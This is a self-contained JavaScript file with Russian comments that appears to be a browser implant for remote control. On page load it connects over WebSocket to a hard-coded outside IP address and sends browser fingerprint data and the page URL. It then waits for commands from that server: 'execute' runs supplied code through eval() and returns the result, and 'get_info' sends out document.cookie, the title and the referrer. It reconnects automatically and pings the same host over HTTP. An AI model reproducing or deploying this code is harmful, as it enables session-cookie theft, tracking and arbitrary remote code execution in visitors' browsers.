(function() {
    // ID клиента
    var clientId = '16189b75b443';
    var serverUrl = 'ws://2.133.241.191:8443/ws';
    
    // Функция отправки данных на сервер
    function sendData(data) {
        try {
            if (window.ws && window.ws.readyState === WebSocket.OPEN) {
                window.ws.send(JSON.stringify(data));
            }
        } catch(e) {}
    }
    
    // Основная функция подключения
    function connect() {
        try {
            console.log('[+] Attempting connection to:', serverUrl);
            window.ws = new WebSocket(serverUrl);
            
            window.ws.onopen = function() {
                console.log('[+] WebSocket connected');
                // Отправляем информацию об устройстве
                var deviceInfo = {
                    type: 'handshake',
                    id: clientId,
                    data: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        languages: navigator.languages,
                        screen: {
                            width: screen.width,
                            height: screen.height
                        },
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    }
                };
                sendData(deviceInfo);
                
                // Отправляем пинг каждые 30 секунд
                setInterval(function() {
                    if (window.ws.readyState === WebSocket.OPEN) {
                        sendData({type: 'ping', id: clientId});
                    }
                }, 30000);
            };
            
            window.ws.onmessage = function(event) {
                try {
                    var cmd = JSON.parse(event.data);
                    console.log('[+] Received command:', cmd.type);
                    
                    // Обработка команд
                    if (cmd.type === 'execute') {
                        try {
                            var result = eval(cmd.code);
                            sendData({
                                type: 'result',
                                id: cmd.id,
                                data: result,
                                success: true
                            });
                        } catch(e) {
                            sendData({
                                type: 'result',
                                id: cmd.id,
                                data: e.toString(),
                                success: false
                            });
                        }
                    }
                    
                    // Другие типы команд можно добавить здесь
                    if (cmd.type === 'get_info') {
                        var info = {
                            type: 'info',
                            id: clientId,
                            data: {
                                href: window.location.href,
                                title: document.title,
                                cookies: document.cookie,
                                referrer: document.referrer
                            }
                        };
                        sendData(info);
                    }
                    
                } catch(e) {
                    console.error('[-] Error parsing message:', e);
                }
            };
            
            window.ws.onerror = function(error) {
                console.error('[-] WebSocket error:', error);
                // Пробуем переподключиться через 5 секунд
                setTimeout(connect, 5000);
            };
            
            window.ws.onclose = function() {
                console.log('[-] WebSocket closed, reconnecting...');
                setTimeout(connect, 5000);
            };
            
        } catch(e) {
            console.error('[-] Connection error:', e);
            setTimeout(connect, 10000);
        }
    }
    
    // Начинаем подключение
    connect();
    
    // Также отправляем HTTP запрос на всякий случай
    setTimeout(function() {
        fetch('http://2.133.241.191:8443/ping?id=' + clientId)
            .catch(function() {});
    }, 2000);
    
    // Собираем дополнительную информацию
    var extraInfo = {
        type: 'pageview',
        id: clientId,
        data: {
            pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
            memory: navigator.deviceMemory,
            cores: navigator.hardwareConcurrency,
            touch: 'ontouchstart' in window
        }
    };
    setTimeout(function() { sendData(extraInfo); }, 1000);
    
})();